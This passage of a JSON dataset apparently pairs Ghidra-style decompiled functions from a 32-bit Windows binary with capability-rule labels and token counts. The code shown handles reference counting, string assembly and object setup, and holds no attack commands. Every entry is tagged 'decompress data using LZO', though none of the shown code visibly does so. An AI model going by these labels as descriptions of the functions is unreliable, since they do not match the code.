        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0044f170(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, int32_t *arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    ulong uVar4;\n    uint32_t in_stack_ffffff84;\n    uchar var_3dh;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    var_3ch = 0;\n    uVar4 = fcn.004915c0(in_stack_ffffff84 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_3ch, 0, &var_34h);\n    if (var_3ch == 0) {\n        if (var_1ch == NULL) {\n            uVar3 = fcn.004be210(0x52380c);\n            fcn.0048b630(&var_3dh);\n            if (var_1ch != NULL) {\n                (*var_1ch)(&var_34h);\n            }\n            fcn.0043a8e0(uVar3);\n            fcn.00483770(&var_3dh);\n            if (var_1ch != NULL) {\n                (*var_1ch)(uVar4 >> 0x20);\n            }\n            fcn.0043a8e0(&var_34h);\n            fcn.004aea60();\n            fcn.004c2c30(&var_34h);\n            fcn.0043a8e0(uVar3);\n            fcn.004aea60();\n            fcn.004c2c30(&var_34h);\n            fcn.0043a8e0(uVar3);\n            fcn.004aea60();\n            do {\n                fcn.004c2c30(&var_34h);\n                fcn.0043a8e0(uVar3);\n                fcn.004c2c30(&var_34h);\n                fcn.0043a8e0(uVar3);\n                fcn.00453450();\n                fcn.0048df30();\n            } while( true );\n        }\n        fcn.0048cd00(var_34h, var_30h, &var_3dh);\n        fcn.0048b880(&var_38h);\n        if (*0x515a34 == 0) {\n            iVar2 = *(var_38h + -4);\n            *(var_38h + -4) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_38h + -4;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            fcn.0048b610(&var_3dh);\n        }\n    }\n    else {\n        *arg_20h = var_3ch;\n    }\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar4;\n}\n",
        "token_count": 803
    },
    "0044f3b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0044f3b0(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, \n            int32_t *arg_20h, uint *arg_24h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    code *unaff_EBX;\n    uint64_t uVar4;\n    uint32_t in_stack_ffffff54;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_34h;\n    int32_t var_30h;\n    code *var_1ch;\n    code *var_bp_ch;\n    \n    var_1ch = NULL;\n    var_50h = 0;\n    var_bp_ch = unaff_EBX;\n    uVar4 = fcn.00491700(in_stack_ffffff54 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_50h, 0, &var_34h);\n    uVar2 = uVar4;\n    if (var_50h != 0) {\n        *arg_20h = var_50h;\n        goto code_r0x0044f43b;\n    }\n    if (var_1ch == NULL) {\n        uVar3 = fcn.004be210(\"uninitialized __any_string\");\n        if (var_1ch != NULL) {\n            (*var_1ch)(&var_34h);\n        }\n        fcn.0043a8e0(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0043a8e0(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0043a8e0(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0043a8e0(uVar3);\n        if (var_bp_ch != NULL) {\n            (*var_bp_ch)(uVar2);\n        }\n        fcn.0043a8e0(uVar3);\n        if (var_1ch != NULL) {\n            (*var_1ch)(uVar2);\n        }\n        fcn.0043a8e0(uVar3);\n        if (var_1ch != NULL) {\n            (*var_1ch)(uVar2);\n        }\n        fcn.0043a8e0(uVar3);\n        fcn.004aea60();\n        fcn.004c2c30(uVar3);\n        fcn.0043a8e0(uVar2);\n        fcn.004aea60();\n        fcn.004c2c30(uVar3);\n        fcn.0043a8e0(uVar2);\n        fcn.004aea60();\n        do {\n            fcn.004c2c30(uVar3);\n            fcn.0043a8e0(uVar2);\n            fcn.004c2c30(uVar3);\n            fcn.0043a8e0(uVar2);\n            fcn.00453450();\n            fcn.004af570();\n        } while( true );\n    }\n    var_4ch = &var_44h;\n    fcn.004b3070(var_34h, var_34h + var_30h * 2, arg_8h & 0xffffff00);\n    puVar1 = *arg_24h;\n    if (var_4ch == &var_44h) {\n        fcn.004b4c60(&var_4ch);\n        puVar1 = var_4ch;\n        uVar2 = var_44h;\n    }\n    else {\n        if (puVar1 == arg_24h + 2) {\n            *arg_24h = var_4ch;\n            arg_24h[1] = var_48h;\n            arg_24h[2] = var_44h;\n            goto code_r0x0044f43b;\n        }\n        uVar2 = arg_24h[2];\n        *arg_24h = var_4ch;\n        arg_24h[1] = var_48h;\n        arg_24h[2] = var_44h;\n        if (puVar1 == NULL) goto code_r0x0044f43b;\n    }\n    var_44h = uVar2;\n    var_4ch = puVar1;\n    var_48h = 0;\n    *var_4ch = 0;\n    if (var_4ch != &var_44h) {\n        fcn.004c2c30(var_4ch);\n    }\ncode_r0x0044f43b:\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar4 & 0xffffffff | (arg_ch & 0xffff0000 | uVar4 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 1247
    },
    "0044f530": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint64_t __cdecl\nfcn.0044f530(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch, int32_t *arg_20h\n            , uint arg_24h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    uint64_t uVar5;\n    uint32_t in_stack_ffffff74;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_3dh;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    var_3ch = 0;\n    uVar5 = fcn.00491890(in_stack_ffffff74 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h & 0xff\n                         , arg_1ch, &var_3ch, 0, &var_34h);\n    uVar2 = uVar5;\n    if (var_3ch == 0) {\n        if (var_1ch == NULL) {\n            uVar4 = fcn.004be210(0x52380c);\n            fcn.00483770(&var_3dh);\n            if (var_1ch != NULL) {\n                (*var_1ch)(&var_34h);\n            }\n            fcn.0043a8e0(uVar4);\n            fcn.004aea60();\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(uVar2);\n            fcn.004aea60();\n            fcn.004c2c30(uVar4);\n            fcn.0043a8e0(uVar2);\n            fcn.004aea60();\n            do {\n                fcn.004c2c30(uVar4);\n                fcn.0043a8e0(uVar2);\n                fcn.004c2c30(uVar4);\n                fcn.0043a8e0(uVar2);\n                fcn.00453450();\n                fcn.0048df30();\n            } while( true );\n        }\n        fcn.00484f70(var_34h, var_30h, &var_3dh);\n        fcn.004839e0(&var_38h);\n        if (*0x515a34 == 0) {\n            iVar3 = *(var_38h + -4);\n            *(var_38h + -4) = iVar3 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_38h + -4;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar3 < 1) {\n            fcn.00483750(&var_3dh);\n        }\n    }\n    else {\n        *arg_20h = var_3ch;\n    }\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar5 & 0xffffffff | (arg_ch & 0xffff0000 | uVar5 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 802
    },
    "0044f8a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.0044f8a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    uVar2 = 0x44f8c9;\n    fcn.0048cd70(arg_1ch);\n    var_30h = *(*arg_1ch + -0xc);\n    var_1ch = 0x4936b0;\n    uVar1 = fcn.00491b30(uVar2 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, \n                         &fcn.0044f8a0::var_34h);\n    if (var_1ch != NULL) {\n        (*var_1ch)(&fcn.0044f8a0::var_34h);\n    }\n    return uVar1;\n}\n",
        "token_count": 310
    },
    "0044fad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.0044fad0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    uVar2 = 0x44faf9;\n    fcn.00485000(arg_1ch);\n    var_30h = *(*arg_1ch + -0xc);\n    var_1ch = 0x493730;\n    uVar1 = fcn.00491d90(uVar2 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, \n                         &fcn.0044fad0::var_34h);\n    if (var_1ch != NULL) {\n        (*var_1ch)(&fcn.0044fad0::var_34h);\n    }\n    return uVar1;\n}\n",
        "token_count": 299
    },
    "004510a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.004510a0(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    (**(*arg_8h + 0xc))(arg_8h, arg_ch);\n    fcn.004907c0(var_ch, *(var_ch + -0xc));\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_ch + -4);\n        *(var_ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.0048b610(&var_dh);\n    return;\n}\n",
        "token_count": 233
    },
    "004514e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004514e0(int32_t *param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    fcn.004512b0();\n    if (*(*param_1 + 0x18) == 0x451560) {\n        return param_2;\n    }\n    // WARNING: Could not recover jumptable at 0x00451520. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**(*param_1 + 0x18))();\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "00451b30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t ** __cdecl fcn.00451b30(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t **ppiVar5;\n    uint uVar6;\n    int32_t **in_ECX;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint *in_stack_ffffffcc;\n    int32_t **var_28h;\n    int32_t s;\n    int32_t *var_20h;\n    int32_t **var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = in_ECX + 2;\n    *in_ECX = var_1ch;\n    *(in_ECX + 2) = 0;\n    iVar9 = *arg_8h;\n    in_ECX[1] = NULL;\n    piVar4 = *(iVar9 + 0x10);\n    s = *piVar4;\n    if (s == 0) {\n        fcn.004b05e0(0, 0, 1, 0x2a);\n        return in_ECX;\n    }\n    if (piVar4[1] == 0) {\ncode_r0x00451da0:\n        iVar9 = s;\n        uVar6 = sub.msvcrt.dll_strlen(s);\n        fcn.004afdd0(0, 0, iVar9, uVar6);\n        return in_ECX;\n    }\n    uVar8 = 0;\n    iVar9 = s;\n    var_28h = in_ECX;\n    var_20h = piVar4;\n    do {\n        uVar8 = uVar8 + 1;\n        iVar1 = var_20h[uVar8];\n        iVar3 = sub.msvcrt.dll_strcmp(iVar9, iVar1);\n        iVar9 = iVar1;\n    } while (uVar8 < 5 && iVar3 == 0);\n    in_ECX = var_28h;\n    if (iVar3 == 0) goto code_r0x00451da0;\n    fcn.004b1bc0(0x80);\n    uVar6 = **0x527c4c;\n    uVar8 = sub.msvcrt.dll_strlen(uVar6);\n    if (0x7fffffffU - var_28h[1] < uVar8) {\n        fcn.004be310(0x523706);\ncode_r0x00451e76:\n        fcn.004be310(0x523706);\ncode_r0x00451e82:\n        fcn.004be310(0x523706);\n    }\n    else {\n        fcn.004b1d40(uVar6, uVar8);\n        piVar4 = var_28h[1];\n        ppiVar5 = *var_28h;\n        if (var_1ch == ppiVar5) {\n            piVar7 = 0xf;\n        }\n        else {\n            piVar7 = var_28h[2];\n        }\n        if (piVar7 < piVar4 + 1) {\n            fcn.004b1f10(piVar4, 0, 0, 1);\n            ppiVar5 = *var_28h;\n        }\n        *(ppiVar5 + piVar4) = 0x3d;\n        var_28h[1] = piVar4 + 1;\n        *(*var_28h + 1 + piVar4) = 0;\n        uVar6 = **(*arg_8h + 0x10);\n        uVar8 = sub.msvcrt.dll_strlen(uVar6);\n        if (uVar8 <= 0x7fffffffU - var_28h[1]) {\n            fcn.004b1d40(uVar6, uVar8);\n            iVar9 = 4;\n            while( true ) {\n                piVar4 = var_28h[1];\n                var_20h = piVar4 + 1;\n                ppiVar5 = *var_28h;\n                if (var_1ch == ppiVar5) {\n                    piVar7 = 0xf;\n                }\n                else {\n                    piVar7 = var_28h[2];\n                }\n                if (piVar7 < var_20h) {\n                    fcn.004b1f10(piVar4, 0, 0, 1);\n                    ppiVar5 = *var_28h;\n                }\n                *(ppiVar5 + piVar4) = 0x3b;\n                var_28h[1] = piVar4 + 1;\n                *(*var_28h + 1 + piVar4) = 0;\n                uVar6 = *(*0x527c4c + iVar9);\n                uVar8 = sub.msvcrt.dll_strlen(uVar6);\n                if (0x7fffffffU - var_28h[1] < uVar8) break;\n                fcn.004b1d40(uVar6, uVar8);\n                piVar4 = var_28h[1];\n                var_20h = piVar4 + 1;\n                ppiVar5 = *var_28h;\n                if (var_1ch == ppiVar5) {\n                    piVar7 = 0xf;\n                }\n                else {\n                    piVar7 = var_28h[2];\n                }\n                if (piVar7 < var_20h) {\n                    uVar8 = 1;\n                    fcn.004b1f10();\n                    ppiVar5 = *var_28h;\n                }\n                *(ppiVar5 + piVar4) = 0x3d;\n                var_28h[1] = piVar4 + 1;\n                *(*var_28h + 1 + piVar4) = 0;\n                uVar6 = *(*(*arg_8h + 0x10) + iVar9);\n                uVar8 = sub.msvcrt.dll_strlen(uVar6, uVar8);\n                if (0x7fffffffU - var_28h[1] < uVar8) goto code_r0x00451e76;\n                fcn.004b1d40(uVar6, uVar8);\n                iVar9 = iVar9 + 4;\n                if (iVar9 == 0x18) {\n                    return var_28h;\n                }\n            }\n            goto code_r0x00451e82;\n        }\n    }\n    piVar4 = fcn.004be310(0x523706);\n    if (var_1ch != *var_28h) {\n        fcn.004c2c30(*var_28h);\n    }\n    fcn.0043a8e0(piVar4);\n    if (in_stack_ffffffcc != &var_28h) {\n        fcn.004c2c30(in_stack_ffffffcc);\n    }\n    if (piVar4 == 0xffffffff) {\n        fcn.004c2f10(var_28h);\n    }\n    uVar6 = fcn.0043a8e0();\n    fcn.004c2e40(uVar6);\n    fcn.004c2fb0();\n    piVar7 = var_28h[1];\n    while (piVar4 = piVar4 + 1,  piVar4 <= var_28h[2] && var_28h[2] != piVar4) {\n        piVar2 = piVar7[piVar4];\n        if (piVar2 != NULL) {\n            if (*0x515a34 == 0) {\n                iVar9 = piVar2[1];\n                piVar2[1] = iVar9 + -1;\n            }\n            else {\n                LOCK();\n                piVar7 = piVar2 + 1;\n                iVar9 = *piVar7;\n                *piVar7 = *piVar7 + -1;\n            }\n            if (iVar9 == 1) {\n                (**(*piVar2 + 4))();\n            }\n            piVar7 = var_28h[1];\n        }\n    }\n    if (piVar7 != NULL) {\n        fcn.004c2c20(piVar7);\n    }\n    ppiVar5 = var_28h[3];\n    if (ppiVar5 != NULL) {\n        if (var_28h[2] != NULL) {\n            piVar4 = NULL;\n            do {\n                piVar7 = ppiVar5[piVar4];\n                if (piVar7 != NULL) {\n                    if (*0x515a34 == 0) {\n                        iVar9 = piVar7[1];\n                        piVar7[1] = iVar9 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar2 = piVar7 + 1;\n                        iVar9 = *piVar2;\n                        *piVar2 = *piVar2 + -1;\n                    }\n                    if (iVar9 == 1) {\n                        (**(*piVar7 + 4))();\n                    }\n                    ppiVar5 = var_28h[3];\n                }\n                piVar4 = piVar4 + 1;\n            } while (piVar4 <= var_28h[2] && var_28h[2] != piVar4);\n            if (ppiVar5 == NULL) goto code_r0x004ae8be;\n        }\n        ppiVar5 = fcn.004c2c20(ppiVar5);\n    }\ncode_r0x004ae8be:\n    piVar4 = var_28h[4];\n    if (piVar4 != NULL) {\n        iVar9 = 0;\n        do {\n            ppiVar5 = *(piVar4 + iVar9);\n            if (ppiVar5 != NULL) {\n                ppiVar5 = fcn.004c2c20(ppiVar5);\n                piVar4 = var_28h[4];\n            }\n            iVar9 = iVar9 + 4;\n        } while (iVar9 != 0x18);\n        if (piVar4 != NULL) {\n            ppiVar5 = fcn.004c2c20(piVar4);\n        }\n    }\n    return ppiVar5;\n}\n",
        "token_count": 2263
    },
    "00451eb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.00451eb0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t *in_ECX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    iVar3 = fcn.0048b140(0, 0, &var_19h);\n    *in_ECX = iVar3;\n    piVar1 = *(*arg_8h + 0x10);\n    iVar8 = *piVar1;\n    if (iVar8 == 0) {\n        fcn.0048b490(0, *(iVar3 + -0xc), 1, 0x2a);\n        return in_ECX;\n    }\n    if (piVar1[1] != 0) {\n        uVar7 = 0;\n        iVar3 = iVar8;\n        do {\n            uVar7 = uVar7 + 1;\n            iVar2 = piVar1[uVar7];\n            iVar4 = sub.msvcrt.dll_strcmp(iVar3, iVar2);\n            iVar3 = iVar2;\n        } while (uVar7 < 5 && iVar4 == 0);\n        if (iVar4 != 0) {\n            fcn.0048c930(0x80);\n            uVar6 = **0x527c4c;\n            uVar5 = sub.msvcrt.dll_strlen(uVar6);\n            fcn.0048ba60(uVar6, uVar5);\n            iVar8 = *in_ECX;\n            iVar3 = *(iVar8 + -0xc);\n            uVar7 = iVar3 + 1;\n            if ((*(iVar8 + -8) <= uVar7 && uVar7 != *(iVar8 + -8)) || (0 < *(iVar8 + -4))) {\n                fcn.0048c930(uVar7);\n            }\n            *(*in_ECX + *(*in_ECX + -0xc)) = 0x3d;\n            iVar8 = *in_ECX;\n            *(iVar8 + -0xc) = uVar7;\n            *(iVar8 + -4) = 0;\n            *(iVar8 + 1 + iVar3) = 0;\n            uVar6 = **(*arg_8h + 0x10);\n            uVar5 = sub.msvcrt.dll_strlen(uVar6);\n            fcn.0048ba60(uVar6, uVar5);\n            iVar8 = 4;\n            do {\n                iVar3 = *in_ECX;\n                iVar2 = *(iVar3 + -0xc);\n                uVar7 = iVar2 + 1;\n                if ((*(iVar3 + -8) <= uVar7 && uVar7 != *(iVar3 + -8)) || (0 < *(iVar3 + -4))) {\n                    fcn.0048c930(uVar7);\n                }\n                *(*in_ECX + *(*in_ECX + -0xc)) = 0x3b;\n                iVar3 = *in_ECX;\n                *(iVar3 + -0xc) = uVar7;\n                *(iVar3 + -4) = 0;\n                *(iVar3 + 1 + iVar2) = 0;\n                uVar6 = *(*0x527c4c + iVar8);\n                uVar5 = sub.msvcrt.dll_strlen(uVar6);\n                fcn.0048ba60(uVar6, uVar5);\n                iVar3 = *in_ECX;\n                iVar2 = *(iVar3 + -0xc);\n                uVar7 = iVar2 + 1;\n                if ((*(iVar3 + -8) <= uVar7 && uVar7 != *(iVar3 + -8)) || (0 < *(iVar3 + -4))) {\n                    fcn.0048c930(uVar7);\n                }\n                *(*in_ECX + *(*in_ECX + -0xc)) = 0x3d;\n                iVar3 = *in_ECX;\n                *(iVar3 + -0xc) = uVar7;\n                *(iVar3 + -4) = 0;\n                *(iVar3 + 1 + iVar2) = 0;\n                uVar6 = *(*(*arg_8h + 0x10) + iVar8);\n                uVar5 = sub.msvcrt.dll_strlen(uVar6);\n                fcn.0048ba60(uVar6, uVar5);\n                iVar8 = iVar8 + 4;\n            } while (iVar8 != 0x18);\n            return in_ECX;\n        }\n    }\n    uVar6 = sub.msvcrt.dll_strlen(iVar8);\n    fcn.0048bda0(iVar8, uVar6);\n    return in_ECX;\n}\n",
        "token_count": 1102
    },
    "00452130": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint * __cdecl fcn.00452130(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint32_t in_stack_ffffffcc;\n    uint32_t uVar4;\n    uint uVar5;\n    uint noname_3;\n    uint noname_4;\n    uint in_stack_ffffffe4;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    uint var_bp_ch;\n    \n    noname_4 = 0xfffffffe;\n    noname_3 = 0x5285a8;\n    uVar5 = 0x5285b0;\n    puVar2 = fcn.004c33d0();\n    if (puVar2 == NULL) {\n        if (arg_8h == 0x516fa0) {\n            puVar3 = fcn.004c2c70(0x68, uVar5);\n            puVar3[1] = 0;\n            *puVar3 = 0x52c530;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            *(puVar3 + 9) = 0;\n            *(puVar3 + 0x19) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cc1c;\n            puVar2[2] = puVar3;\n            uVar4 = 0x4522ef;\n            fcn.004bb160(0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b610;\n            puVar2[4] = puVar3;\n            fcn.00494540(uVar4 & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x516f78) {\n            puVar2 = fcn.004c2c70(0x10, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cab0;\n            uVar5 = fcn.004ae940();\n            puVar2[2] = uVar5;\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b530;\n        }\n        else if (arg_8h == 0x516fa8) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cc64;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b6a0;\n        }\n        else if (arg_8h == 0x516fb8) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            puVar2[1] = 0;\n            *puVar2 = 0x52cd24;\n            puVar2[2] = in_ECX;\n            if (*0x515a34 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b748;\n        }\n        else if (arg_8h == 0x516fc0) {\n            puVar2 = fcn.004c2c70(0xc, uVar5);\n            iVar1 = *0x515a34;\n            puVar2[1] = 0;\n            *puVar2 = 0x52cd54;\n            puVar2[2] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b7a8;\n        }\n        else if (arg_8h == 0x516db0) {\n            puVar3 = fcn.004c2c70(0x44, uVar5);\n            *(puVar3 + 4) = 0;\n            *puVar3 = 0x52c664;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52befc;\n            puVar2[2] = puVar3;\n            fcn.0048db80(0, 0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b870;\n            puVar2[4] = puVar3;\n            fcn.004952b0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x516dac) {\n            puVar3 = fcn.004c2c70(0x44, uVar5);\n            *puVar3 = 0x52c654;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[3] = 0;\n            *(puVar3 + 4) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3[5] = 0;\n            puVar3[6] = 0;\n            puVar3[7] = 0;\n            puVar3[8] = 0;\n            puVar3[9] = 0;\n            puVar3[10] = 0;\n            puVar3[0xb] = 0;\n            puVar3[0xc] = 0;\n            puVar3[0xd] = 0;\n            *(puVar3 + 0x43) = 0;\n            puVar2 = fcn.004c2c70(0x14);\n            puVar2[1] = 0;\n            *puVar2 = 0x52bec8;\n            puVar2[2] = puVar3;\n            fcn.0048d7a0(0, 0);\n            iVar1 = *0x515a34;\n            puVar2[3] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b808;\n            puVar2[4] = puVar3;\n            fcn.00494dd0(in_stack_ffffffcc & 0xffffff00, in_ECX, puVar3);\n        }\n        else if (arg_8h == 0x516f98) {\n            puVar2 = fcn.004c2c70(0x14, uVar5);\n            fcn.004baf00(0);\n            iVar1 = *0x515a34;\n            puVar2[4] = in_ECX;\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            else {\n                LOCK();\n                *(in_ECX + 4) = *(in_ECX + 4) + 1;\n            }\n            *puVar2 = 0x52b5a0;\n        }\n        else if (arg_8h 